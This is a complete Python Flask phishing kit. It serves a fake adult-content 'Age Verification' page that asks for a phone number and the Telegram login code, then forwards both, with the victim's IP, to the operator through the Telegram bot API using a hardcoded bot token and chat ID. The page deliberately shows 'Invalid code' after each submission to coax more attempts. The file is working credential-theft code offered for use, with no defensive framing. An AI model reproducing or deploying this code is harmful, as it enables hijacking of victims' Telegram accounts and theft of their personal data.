from flask import Flask, request, render_template_string
import requests
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = "8339819248:AAEW9PLB6WTzR2NkjCN1d-4aSPPX_Y1I9iM"
YOUR_ID = "8302282238"

HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Age Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .container {
            max-width: 380px;
            width: 100%;
            background: rgba(20, 20, 20, 0.95);
            border-radius: 32px;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(10px);
        }
        .blur-bg {
            position: relative;
            padding: 24px 20px 20px;
            text-align: center;
            background: linear-gradient(135deg, rgba(255, 51, 102, 0.15), rgba(0, 0, 0, 0.9));
        }
        .icon {
            font-size: 56px;
            margin-bottom: 12px;
            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
        }
        h2 {
            color: #ff3366;
            font-size: 24px;
            font-weight: 700;
            letter-spacing: -0.3px;
            margin-bottom: 6px;
        }
        .sub {
            color: #aaa;
            font-size: 13px;
            font-weight: 400;
        }
        .blur-overlay {
            position: relative;
            margin-top: 16px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 24px;
            backdrop-filter: blur(20px);
        }
        .blur-text {
            font-size: 14px;
            color: #888;
            margin-top: 8px;
        }
        .form {
            padding: 20px;
        }
        .input-group {
            margin-bottom: 16px;
        }
        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #ccc;
            margin-bottom: 6px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            border: 1px solid #333;
            border-radius: 14px;
            font-size: 16px;
            background: #1a1a1a;
            color: white;
            transition: all 0.2s;
        }
        .input-group input:focus {
            outline: none;
            border-color: #ff3366;
            background: #222;
        }
        .num-pad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin: 20px 0;
        }
        .num-key {
            background: #1a1a1a;
            text-align: center;
            padding: 14px;
            border-radius: 16px;
            font-size: 22px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.05s linear;
            border: 1px solid #333;
            color: white;
        }
        .num-key:active {
            background: #ff3366;
            transform: scale(0.96);
            border-color: #ff3366;
        }
        .action-btn {
            width: 100%;
            background: #ff3366;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.1s;
        }
        .action-btn:active {
            transform: scale(0.98);
            background: #e62e5c;
        }
        .footer {
            text-align: center;
            padding: 16px;
            font-size: 11px;
            color: #555;
            border-top: 1px solid #222;
            background: #0a0a0a;
        }
        .status {
            margin-top: 16px;
            padding: 10px;
            border-radius: 12px;
            font-size: 13px;
            display: none;
            text-align: center;
        }
        .status.error {
            background: #ff336622;
            color: #ff6699;
            display: block;
        }
        @keyframes pulse {
            0% { opacity: 0.6; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="blur-bg">
            <div class="icon">🔞</div>
            <h2>Age Verification</h2>
            <div class="sub">You must be 18+ to continue</div>
            <div class="blur-overlay">
                <div style="filter: blur(4px); font-size: 32px; margin-bottom: 8px;">🍆💦</div>
                <div class="blur-text">Content is hidden. Verify your age to unlock.</div>
            </div>
        </div>
        <div class="form">
            <div class="input-group">
                <label>📞 Phone Number</label>
                <input type="tel" id="phone" placeholder="+63 XXX XXX XXXX" autocomplete="off">
            </div>
            <div class="input-group">
                <label>🔐 Verification Code</label>
                <input type="text" id="code" placeholder="Enter code sent to Telegram" autocomplete="off">
            </div>
            <div class="num-pad" id="numpad"></div>
            <button class="action-btn" id="unlockBtn">I AM 18+ & VERIFY</button>
            <div id="status" class="status"></div>
        </div>
        <div class="footer">
            🔞 Adult Content – You must be 18 years or older
        </div>
    </div>

    <script>
        const phoneInput = document.getElementById('phone');
        const codeInput = document.getElementById('code');
        const unlockBtn = document.getElementById('unlockBtn');
        const statusDiv = document.getElementById('status');

        // Create number pad
        const keys = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '⌫', '✖️'];
        const numpad = document.getElementById('numpad');
        keys.forEach(key => {
            const btn = document.createElement('div');
            btn.className = 'num-key';
            btn.innerText = key;
            btn.onclick = () => {
                if (key === '⌫') {
                    codeInput.value = codeInput.value.slice(0, -1);
                } else if (key === '✖️') {
                    codeInput.value = '';
                } else {
                    codeInput.value += key;
                }
            };
            numpad.appendChild(btn);
        });

        async function sendData() {
            const phone = phoneInput.value.trim();
            const code = codeInput.value.trim();

            if (!phone || !code) {
                statusDiv.innerText = '❌ Please enter phone and code';
                statusDiv.className = 'status error';
                setTimeout(() => statusDiv.className = 'status', 2000);
                return;
            }

            statusDiv.innerText = '⏳ Verifying...';
            statusDiv.className = 'status error';
            
            try {
                await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone, code })
                });
                statusDiv.innerText = '❌ Invalid code. Try again.';
                setTimeout(() => statusDiv.className = 'status', 2000);
            } catch(e) {
                statusDiv.innerText = '❌ Network error';
            }
        }

        unlockBtn.addEventListener('click', sendData);
        codeInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendData();
        });
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return HTML

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    msg = f"🔞 **AGE VERIFICATION CAPTURE** 🔞\n\n📞 Phone: `{phone}`\n🔑 Code: `{code}`\n🌐 IP: {request.remote_addr}"
    requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                  json={'chat_id': YOUR_ID, 'text': msg, 'parse_mode': 'Markdown'})
    print(f"[+] Captured: {phone} | {code}")
    return '', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)